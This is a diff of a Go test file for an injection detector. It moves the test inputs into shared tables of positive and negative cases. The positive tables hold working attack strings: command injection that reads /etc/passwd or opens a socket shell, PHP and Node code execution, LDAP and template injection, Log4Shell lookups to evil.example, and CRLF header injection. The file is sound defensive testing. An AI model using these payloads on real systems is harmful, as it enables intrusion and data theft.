@@ -33,32 +33,10 @@ var injectionLegit = []string{
 	"दूध और ब्रेड; गेट पर छोड़ दें",
 }
 
-func assertHits(t *testing.T, name string, fn func(string) (Hit, bool), want Hit, vals []string) {
-	t.Helper()
-	for _, v := range vals {
-		hit, ok := fn(v)
-		if !ok {
-			t.Errorf("%s(%q) = no hit, want hit", name, v)
-			continue
-		}
-		if hit != want {
-			t.Errorf("%s(%q) = %+v, want %+v", name, v, hit, want)
-		}
-	}
-}
-
-func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals []string) {
-	t.Helper()
-	for _, v := range append(vals, injectionLegit...) {
-		if hit, ok := fn(v); ok {
-			t.Errorf("%s(%q) = %+v, want no hit", name, v, hit)
-		}
-	}
-}
-
-func TestCmdIPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
-	assertHits(t, "CmdI", CmdI, want, []string{
+// Positive and negative tables, package-level so that ScanText's tests
+// (scan_test.go) can run every one of them through the combined scan.
+var (
+	cmdIPositives = []string{
 		"; id",
 		"| cat /etc/passwd",
 		"`whoami`",
@@ -107,11 +85,8 @@ func TestCmdIPositives(t *testing.T) {
 		"; python -c 'import os'",
 		"; chmod +x /tmp/m",
 		"0<&196;exec 196<>/dev/udp/10.0.0.1/53",
-	})
-}
-
-func TestCmdINegatives(t *testing.T) {
-	assertNoHits(t, "CmdI", CmdI, []string{
+	}
+	cmdINegatives = []string{
 		"see you; id card copy",
 		"Bring your ID; ID card copy needed",
 		"Call on arrival\nID",
@@ -159,12 +134,8 @@ func TestCmdINegatives(t *testing.T) {
 		"Tea & ls -lovers mug",
 		"Notes; chmod later",
 		"Call me | nc -sorry 12 hours",
-	})
-}
-
-func TestCodeIPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
-	assertHits(t, "CodeI", CodeI, want, []string{
+	}
+	codeIPositives = []string{
 		"<?php system($_GET['c']); ?>",
 		"eval(base64_decode('cGhwaW5mbygpOw=='))",
 		"require('child_process').exec('id')",
@@ -175,18 +146,14 @@ func TestCodeIPositives(t *testing.T) {
 		"process.mainModule.require('child_process').execSync('id')",
 		`require("child_process").spawn("sh")`,
 		"%3C%3Fphp%20phpinfo()%3B",
-	})
-	ser := Hit{RuleID: "AEG-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
-	assertHits(t, "CodeI", CodeI, ser, []string{
+	}
+	codeISerializedPositives = []string{
 		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
 		"aced00057372001",
 		"data=rO0ABXNy",
 		"ACED0005737200",
-	})
-}
-
-func TestCodeINegatives(t *testing.T) {
-	assertNoHits(t, "CodeI", CodeI, []string{
+	}
+	codeINegatives = []string{
 		"eval(uation) pending",
 		"assert your rights",
 		"<? what is this",
@@ -198,23 +165,16 @@ func TestCodeINegatives(t *testing.T) {
 		"order xrO0ABXNy",
 		"Room 0AB, block 5",
 		"I'm in the middle of a process.",
-	})
-}
-
-func TestLDAPPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
-	assertHits(t, "LDAP", LDAP, want, []string{
+	}
+	ldapPositives = []string{
 		"*)(uid=*))(|(uid=*",
 		// Beyond the brief.
 		"admin)(&(password=*)",
 		"x)(!(objectClass=*)",
 		"*)(objectClass=*",
 		"%2A%29%28uid%3D%2A",
-	})
-}
-
-func TestLDAPNegatives(t *testing.T) {
-	assertNoHits(t, "LDAP", LDAP, []string{
+	}
+	ldapNegatives = []string{
 		"(2 pcs)(blue)",
 		"Rice (5 kg) * (2)",
 		"smile :)(",
@@ -222,12 +182,8 @@ func TestLDAPNegatives(t *testing.T) {
 		"a*b",
 		"Size (M)(L) & (XL)",
 		"5 stars* (see review)",
-	})
-}
-
-func TestSSTIPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
-	assertHits(t, "SSTI", SSTI, want, []string{
+	}
+	sstiPositives = []string{
 		"{{config.items()}}",
 		"{{''.__class__.__mro__[1].__subclasses__()}}",
 		"${T(java.lang.Runtime).getRuntime().exec('id')}",
@@ -246,11 +202,8 @@ func TestSSTIPositives(t *testing.T) {
 		"{%for x in y%}",
 		"%7B%7Bconfig%7D%7D",
 		"{{ {{config.items()}}",
-	})
-}
-
-func TestSSTINegatives(t *testing.T) {
-	assertNoHits(t, "SSTI", SSTI, []string{
+	}
+	sstiNegatives = []string{
 		"{{ first_name }}",
 		"Hi {{name}}, your order {{order_id}} is ready",
 		"{{ self pickup }}",
@@ -267,12 +220,8 @@ func TestSSTINegatives(t *testing.T) {
 		"{% discount %}",
 		"Total ${ 500 }",
 		"${T}",
-	})
-}
-
-func TestJNDIPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
-	assertHits(t, "JNDI", JNDI, want, []string{
+	}
+	jndiPositives = []string{
 		"${jndi:ldap://evil.example/a}",
 		"${${lower:j}ndi:${lower:l}dap://evil.example/a}",
 		"${jndi:rmi://evil.example/x}",
@@ -284,22 +233,15 @@ func TestJNDIPositives(t *testing.T) {
 		"${${upper:j}${upper:n}di:ldap://evil.example/a}",
 		"User-Agent: ${jndi:ldap://evil.example/a",
 		"%24%7Bjndi:ldap://evil.example/a%7D",
-	})
-}
-
-func TestJNDINegatives(t *testing.T) {
-	assertNoHits(t, "JNDI", JNDI, []string{
+	}
+	jndiNegatives = []string{
 		"${name} lower:",
 		"jndi:ldap is a Java thing",
 		"${lower:hello}",
 		"${::-x}${::-y}",
 		"}}}${${${",
-	})
-}
-
-func TestCRLFPositives(t *testing.T) {
-	want := Hit{RuleID: "AEG-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
-	assertHits(t, "CRLF", CRLF, want, []string{
+	}
+	crlfPositives = []string{
 		"x%0d%0aSet-Cookie:%20admin=true",
 		"x\r\nSet-Cookie: admin=true",
 		// Beyond the brief.
@@ -310,11 +252,8 @@ func TestCRLFPositives(t *testing.T) {
 		"x\r\nContent-Type: text/html",
 		"x\rTransfer-Encoding: chunked",
 		"x\r\nAccess-Control-Allow-Origin: *",
-	})
-}
-
-func TestCRLFNegatives(t *testing.T) {
-	assertNoHits(t, "CRLF", CRLF, []string{
+	}
+	crlfNegatives = []string{
 		"Line 1\nNote: ring bell",
 		"Address:\r\nFlat 3B\r\nLocation: near masjid",
 		"Item list\nContent: rice, dal",
@@ -322,7 +261,86 @@ func TestCRLFNegatives(t *testing.T) {
 		"Notes\r\nSet up a time: 5pm",
 		"Set-Cookie: on one line is just text",
 		"Cookie: chocolate chip\nCookies: 2 packs",
-	})
+	}
+)
+
+func assertHits(t *testing.T, name string, fn func(string) (Hit, bool), want Hit, vals []string) {
+	t.Helper()
+	for _, v := range vals {
+		hit, ok := fn(v)
+		if !ok {
+			t.Errorf("%s(%q) = no hit, want hit", name, v)
+			continue
+		}
+		if hit != want {
+			t.Errorf("%s(%q) = %+v, want %+v", name, v, hit, want)
+		}
+	}
+}
+
+func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals []string) {
+	t.Helper()
+	for _, v := range append(append([]string(nil), vals...), injectionLegit...) {
+		if hit, ok := fn(v); ok {
+			t.Errorf("%s(%q) = %+v, want no hit", name, v, hit)
+		}
+	}
+}
+
+func TestCmdIPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
+	assertHits(t, "CmdI", CmdI, want, cmdIPositives)
+}
+
+func TestCmdINegatives(t *testing.T) {
+	assertNoHits(t, "CmdI", CmdI, cmdINegatives)
+}
+
+func TestCodeIPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
+	assertHits(t, "CodeI", CodeI, want, codeIPositives)
+	ser := Hit{RuleID: "AEG-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
+	assertHits(t, "CodeI", CodeI, ser, codeISerializedPositives)
+}
+
+func TestCodeINegatives(t *testing.T) {
+	assertNoHits(t, "CodeI", CodeI, codeINegatives)
+}
+
+func TestLDAPPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
+	assertHits(t, "LDAP", LDAP, want, ldapPositives)
+}
+
+func TestLDAPNegatives(t *testing.T) {
+	assertNoHits(t, "LDAP", LDAP, ldapNegatives)
+}
+
+func TestSSTIPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
+	assertHits(t, "SSTI", SSTI, want, sstiPositives)
+}
+
+func TestSSTINegatives(t *testing.T) {
+	assertNoHits(t, "SSTI", SSTI, sstiNegatives)
+}
+
+func TestJNDIPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
+	assertHits(t, "JNDI", JNDI, want, jndiPositives)
+}
+
+func TestJNDINegatives(t *testing.T) {
+	assertNoHits(t, "JNDI", JNDI, jndiNegatives)
+}
+
+func TestCRLFPositives(t *testing.T) {
+	want := Hit{RuleID: "AEG-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
+	assertHits(t, "CRLF", CRLF, want, crlfPositives)
+}
+
+func TestCRLFNegatives(t *testing.T) {
+	assertNoHits(t, "CRLF", CRLF, crlfNegatives)
 }
 
 // TestInjectionAdversarialTime checks the scanners stay linear on long
